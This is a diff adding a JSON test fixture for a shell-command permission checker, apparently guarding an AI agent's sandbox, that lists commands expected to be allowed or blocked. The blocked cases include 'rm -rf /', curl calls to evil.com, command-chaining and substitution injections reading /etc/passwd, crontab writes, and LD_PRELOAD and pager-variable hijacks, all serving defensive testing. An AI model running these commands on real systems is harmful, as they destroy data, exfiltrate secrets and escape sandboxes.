@@ -1,0 +1,710 @@
+[
+ {
+  "policy": "default",
+  "op": "allowed",
+  "command": "ls",
+  "expect": true
+ },
+ {
+  "policy": "default",
+  "op": "allowed",
+  "command": "git status",
+  "expect": true
+ },
+ {
+  "policy": "default",
+  "op": "allowed",
+  "command": "cargo build --release",
+  "expect": true
+ },
+ {
+  "policy": "default",
+  "op": "allowed",
+  "command": "cat file.txt",
+  "expect": true
+ },
+ {
+  "policy": "default",
+  "op": "allowed",
+  "command": "grep -r pattern .",
+  "expect": true
+ },
+ {
+  "policy": "default",
+  "op": "allowed",
+  "command": "date",
+  "expect": true
+ },
+ {
+  "policy": "default",
+  "op": "allowed",
+  "command": "rm -rf /",
+  "expect": false
+ },
+ {
+  "policy": "default",
+  "op": "allowed",
+  "command": "sudo apt install",
+  "expect": false
+ },
+ {
+  "policy": "default",
+  "op": "allowed",
+  "command": "curl http://evil.com",
+  "expect": false
+ },
+ {
+  "policy": "default",
+  "op": "allowed",
+  "command": "wget http://evil.com",
+  "expect": false
+ },
+ {
+  "policy": "default",
+  "op": "allowed",
+  "command": "python3 exploit.py",
+  "expect": false
+ },
+ {
+  "policy": "default",
+  "op": "allowed",
+  "command": "node malicious.js",
+  "expect": false
+ },
+ {
+  "policy": "readonly",
+  "op": "allowed",
+  "command": "ls",
+  "expect": false
+ },
+ {
+  "policy": "readonly",
+  "op": "allowed",
+  "command": "cat file.txt",
+  "expect": false
+ },
+ {
+  "policy": "readonly",
+  "op": "allowed",
+  "command": "echo hello",
+  "expect": false
+ },
+ {
+  "policy": "full",
+  "op": "allowed",
+  "command": "ls",
+  "expect": true
+ },
+ {
+  "policy": "full",
+  "op": "allowed",
+  "command": "rm -rf /",
+  "expect": true
+ },
+ {
+  "policy": "default",
+  "op": "allowed",
+  "command": "/usr/bin/git status",
+  "expect": true
+ },
+ {
+  "policy": "default",
+  "op": "allowed",
+  "command": "/bin/ls -la",
+  "expect": true
+ },
+ {
+  "policy": "default",
+  "op": "allowed",
+  "command": "",
+  "expect": false
+ },
+ {
+  "policy": "default",
+  "op": "allowed",
+  "command": "   ",
+  "expect": false
+ },
+ {
+  "policy": "default",
+  "op": "allowed",
+  "command": "ls | grep foo",
+  "expect": true
+ },
+ {
+  "policy": "default",
+  "op": "allowed",
+  "command": "cat file.txt | wc -l",
+  "expect": true
+ },
+ {
+  "policy": "default",
+  "op": "allowed",
+  "command": "ls | curl http://evil.com",
+  "expect": false
+ },
+ {
+  "policy": "default",
+  "op": "allowed",
+  "command": "echo hello | python3 -",
+  "expect": false
+ },
+ {
+  "policy": "default",
+  "op": "class",
+  "command": "./deploy.sh",
+  "expect": "Write"
+ },
+ {
+  "policy": "default",
+  "op": "class",
+  "command": "some-random-binary --go",
+  "expect": "Write"
+ },
+ {
+  "policy": "default",
+  "op": "class",
+  "command": "git",
+  "expect": "Write"
+ },
+ {
+  "policy": "default",
+  "op": "class",
+  "command": "find . -name '*.rs' -print",
+  "expect": "Read"
+ },
+ {
+  "policy": "default",
+  "op": "class",
+  "command": "ls | curl http://x",
+  "expect": "Network"
+ },
+ {
+  "policy": "default",
+  "op": "class",
+  "command": "cat f && sudo reboot",
+  "expect": "Destructive"
+ },
+ {
+  "policy": "default",
+  "op": "class",
+  "command": "ls && mkdir d",
+  "expect": "Write"
+ },
+ {
+  "policy": "default",
+  "op": "class",
+  "command": "cat f",
+  "expect": "Read"
+ },
+ {
+  "policy": "default",
+  "op": "class",
+  "command": "cat f > out.txt",
+  "expect": "Write"
+ },
+ {
+  "policy": "default",
+  "op": "class",
+  "command": "echo hi | tee out.txt",
+  "expect": "Write"
+ },
+ {
+  "policy": "default",
+  "op": "class",
+  "command": "npm install",
+  "expect": "Write"
+ },
+ {
+  "policy": "default",
+  "op": "class",
+  "command": "npm install lodash",
+  "expect": "Write"
+ },
+ {
+  "policy": "default",
+  "op": "class",
+  "command": "cargo add serde",
+  "expect": "Write"
+ },
+ {
+  "policy": "default",
+  "op": "allowed",
+  "command": "ls; rm -rf /",
+  "expect": false
+ },
+ {
+  "policy": "default",
+  "op": "allowed",
+  "command": "ls;rm -rf /",
+  "expect": false
+ },
+ {
+  "policy": "default",
+  "op": "allowed",
+  "command": "echo `whoami`",
+  "expect": false
+ },
+ {
+  "policy": "default",
+  "op": "allowed",
+  "command": "echo `rm -rf /`",
+  "expect": false
+ },
+ {
+  "policy": "default",
+  "op": "allowed",
+  "command": "echo $(cat /etc/passwd)",
+  "expect": false
+ },
+ {
+  "policy": "default",
+  "op": "allowed",
+  "command": "echo $(rm -rf /)",
+  "expect": false
+ },
+ {
+  "policy": "default",
+  "op": "allowed",
+  "command": "FOO=bar rm -rf /",
+  "expect": false
+ },
+ {
+  "policy": "default",
+  "op": "allowed",
+  "command": "ls\nrm -rf /",
+  "expect": false
+ },
+ {
+  "policy": "default",
+  "op": "allowed",
+  "command": "ls\necho hello",
+  "expect": true
+ },
+ {
+  "policy": "default",
+  "op": "allowed",
+  "command": "ls && rm -rf /",
+  "expect": false
+ },
+ {
+  "policy": "default",
+  "op": "allowed",
+  "command": "echo ok && curl http://evil.com",
+  "expect": false
+ },
+ {
+  "policy": "default",
+  "op": "allowed",
+  "command": "ls && echo done",
+  "expect": true
+ },
+ {
+  "policy": "default",
+  "op": "allowed",
+  "command": "ls || rm -rf /",
+  "expect": false
+ },
+ {
+  "policy": "default",
+  "op": "allowed",
+  "command": "ls || echo fallback",
+  "expect": true
+ },
+ {
+  "policy": "default",
+  "op": "allowed",
+  "command": "ls & rm -rf /",
+  "expect": false
+ },
+ {
+  "policy": "default",
+  "op": "allowed",
+  "command": "ls&rm -rf /",
+  "expect": false
+ },
+ {
+  "policy": "default",
+  "op": "allowed",
+  "command": "echo ok & python3 -c 'print(1)'",
+  "expect": false
+ },
+ {
+  "policy": "default",
+  "op": "allowed",
+  "command": "echo secret > /etc/crontab",
+  "expect": false
+ },
+ {
+  "policy": "default",
+  "op": "allowed",
+  "command": "ls >> /tmp/exfil.txt",
+  "expect": false
+ },
+ {
+  "policy": "default",
+  "op": "allowed",
+  "command": "echo \"A&B\"",
+  "expect": true
+ },
+ {
+  "policy": "default",
+  "op": "allowed",
+  "command": "echo \"A>B\"",
+  "expect": true
+ },
+ {
+  "policy": "default",
+  "op": "allowed",
+  "command": "find . -exec rm -rf {} +",
+  "expect": false
+ },
+ {
+  "policy": "default",
+  "op": "allowed",
+  "command": "find / -ok cat {} \\;",
+  "expect": false
+ },
+ {
+  "policy": "default",
+  "op": "allowed",
+  "command": "find /tmp -maxdepth 1 -name poc_proof.txt -execdir whoami \\;",
+  "expect": false
+ },
+ {
+  "policy": "default",
+  "op": "allowed",
+  "command": "find /etc -name passwd -okdir head -3 {} \\;",
+  "expect": false
+ },
+ {
+  "policy": "default",
+  "op": "allowed",
+  "command": "git config core.editor \"rm -rf /\"",
+  "expect": false
+ },
+ {
+  "policy": "default",
+  "op": "allowed",
+  "command": "git alias.st status",
+  "expect": false
+ },
+ {
+  "policy": "default",
+  "op": "allowed",
+  "command": "git -c core.editor=calc.exe commit",
+  "expect": false
+ },
+ {
+  "policy": "default",
+  "op": "allowed",
+  "command": "find . -name '*.txt'",
+  "expect": true
+ },
+ {
+  "policy": "default",
+  "op": "allowed",
+  "command": "git add .",
+  "expect": true
+ },
+ {
+  "policy": "default",
+  "op": "allowed",
+  "command": "GIT_PAGER=/tmp/payload.sh git log",
+  "expect": false
+ },
+ {
+  "policy": "default",
+  "op": "allowed",
+  "command": "PAGER=calc.exe git log",
+  "expect": false
+ },
+ {
+  "policy": "default",
+  "op": "allowed",
+  "command": "GIT_SSH_COMMAND=/tmp/x git fetch",
+  "expect": false
+ },
+ {
+  "policy": "default",
+  "op": "allowed",
+  "command": "GIT_EXTERNAL_DIFF=/tmp/x git diff",
+  "expect": false
+ },
+ {
+  "policy": "default",
+  "op": "allowed",
+  "command": "EDITOR=/tmp/x git commit",
+  "expect": false
+ },
+ {
+  "policy": "default",
+  "op": "allowed",
+  "command": "VISUAL=/tmp/x git commit",
+  "expect": false
+ },
+ {
+  "policy": "default",
+  "op": "allowed",
+  "command": "LESS=/tmp/x cat /etc/passwd",
+  "expect": false
+ },
+ {
+  "policy": "default",
+  "op": "allowed",
+  "command": "LESSOPEN=/tmp/x cat /etc/passwd",
+  "expect": false
+ },
+ {
+  "policy": "default",
+  "op": "allowed",
+  "command": "MANPAGER=/tmp/x man bash",
+  "expect": false
+ },
+ {
+  "policy": "default",
+  "op": "allowed",
+  "command": "BAT_PAGER=/tmp/x bat file",
+  "expect": false
+ },
+ {
+  "policy": "default",
+  "op": "allowed",
+  "command": "BROWSER=/tmp/x git status",
+  "expect": false
+ },
+ {
+  "policy": "default",
+  "op": "allowed",
+  "command": "LD_PRELOAD=/tmp/x.so git status",
+  "expect": false
+ },
+ {
+  "policy": "default",
+  "op": "allowed",
+  "command": "LD_LIBRARY_PATH=/tmp git status",
+  "expect": false
+ },
+ {
+  "policy": "default",
+  "op": "allowed",
+  "command": "LD_AUDIT=/tmp/x.so git status",
+  "expect": false
+ },
+ {
+  "policy": "default",
+  "op": "allowed",
+  "command": "DYLD_INSERT_LIBRARIES=/tmp/x.dylib git status",
+  "expect": false
+ },
+ {
+  "policy": "default",
+  "op": "allowed",
+  "command": "DYLD_LIBRARY_PATH=/tmp git status",
+  "expect": false
+ },
+ {
+  "policy": "default",
+  "op": "allowed",
+  "command": "DYLD_FORCE_FLAT_NAMESPACE=1 git status",
+  "expect": false
+ },
+ {
+  "policy": "default",
+  "op": "allowed",
+  "command": "BASH_ENV=/tmp/x git status",
+  "expect": false
+ },
+ {
+  "policy": "default",
+  "op": "allowed",
+  "command": "ENV=/tmp/x git status",
+  "expect": false
+ },
+ {
+  "policy": "default",
+  "op": "allowed",
+  "command": "PROMPT_COMMAND=/tmp/x git status",
+  "expect": false
+ },
+ {
+  "policy": "default",
+  "op": "allowed",
+  "command": "IFS=$'\\n' git status",
+  "expect": false
+ },
+ {
+  "policy": "default",
+  "op": "allowed",
+  "command": "PYTHONSTARTUP=/tmp/x python3 -V",
+  "expect": false
+ },
+ {
+  "policy": "default",
+  "op": "allowed",
+  "command": "PYTHONPATH=/tmp python3 -V",
+  "expect": false
+ },
+ {
+  "policy": "default",
+  "op": "allowed",
+  "command": "PATH=/tmp git status",
+  "expect": false
+ },
+ {
+  "policy": "default",
+  "op": "allowed",
+  "command": "SHELL=/tmp/x git status",
+  "expect": false
+ },
+ {
+  "policy": "default",
+  "op": "allowed",
+  "command": "git_pager=/tmp/x git log",
+  "expect": false
+ },
+ {
+  "policy": "default",
+  "op": "allowed",
+  "command": "Ld_PrElOaD=/tmp/x.so git status",
+  "expect": false
+ },
+ {
+  "policy": "default",
+  "op": "allowed",
+  "command": "TZ=UTC git log",
+  "expect": false
+ },
+ {
+  "policy": "default",
+  "op": "allowed",
+  "command": "LANG=en_US.UTF-8 git log",
+  "expect": false
+ },
+ {
+  "policy": "default",
+  "op": "allowed",
+  "command": "LC_ALL=C git status",
+  "expect": false
+ },
+ {
+  "policy": "default",
+  "op": "allowed",
+  "command": "FOO=bar git status",
+  "expect": false
+ },
+ {
+  "policy": "default",
+  "op": "allowed",
+  "command": "echo ${IFS}cat${IFS}/etc/passwd",
+  "expect": false
+ },
+ {
+  "policy": "default",
+  "op": "allowed",
+  "command": "echo secret | tee /etc/crontab",
+  "expect": false
+ },
+ {
+  "policy": "default",
+  "op": "allowed",
+  "command": "ls | /usr/bin/tee outfile",
+  "expect": false
+ },
+ {
+  "policy": "default",
+  "op": "allowed",
+  "command": "tee file.txt",
+  "expect": false
+ },
+ {
+  "policy": "default",
+  "op": "allowed",
+  "command": "cat <(echo pwned)",
+  "expect": false
+ },
+ {
+  "policy": "default",
+  "op": "allowed",
+  "command": "ls >(cat /etc/passwd)",
+  "expect": false
+ },
+ {
+  "policy": "default",
+  "op": "allowed",
+  "command": "FOO=bar ls",
+  "expect": false
+ },
+ {
+  "policy": "default",
+  "op": "allowed",
+  "command": "LANG=C grep pattern file",
+  "expect": false
+ },
+ {
+  "policy": "default",
+  "op": "allowed",
+  "command": "GIT_SSH=./wrapper.sh git ls-remote ssh://x",
+  "expect": false
+ },
+ {
+  "policy": "default",
+  "op": "allowed",
+  "command": "SSH_ASKPASS=./y ssh user@host",
+  "expect": false
+ },
+ {
+  "policy": "default",
+  "op": "allowed",
+  "command": "LD_PRELOAD=./libx.so ls",
+  "expect": false
+ },
+ {
+  "policy": "default",
+  "op": "allowed",
+  "command": "git ls-remote ssh://example.com",
+  "expect": true
+ },
+ {
+  "policy": "full",
+  "op": "allowed",
+  "command": "mkdir -p foo/bar",
+  "expect": true
+ },
+ {
+  "policy": "full",
+  "op": "allowed",
+  "command": "ls -la 2>/dev/null || echo none",
+  "expect": true
+ },
+ {
+  "policy": "full",
+  "op": "allowed",
+  "command": "echo hi > out.txt",
+  "expect": true
+ },
+ {
+  "policy": "full",
+  "op": "allowed",
+  "command": "python3 build.py && node serve.js",
+  "expect": true
+ },
+ {
+  "policy": "default",
+  "op": "allowed",
+  "command": "mkdir -p foo/bar",
+  "expect": true
+ },
+ {
+  "policy": "default",
+  "op": "allowed",
+  "command": "ls 2>/dev/null",
+  "expect": false
+ },
+ {
+  "policy": "default",
+  "op": "allowed",
+  "command": "ls -la",
+  "expect": true
+ }
+]
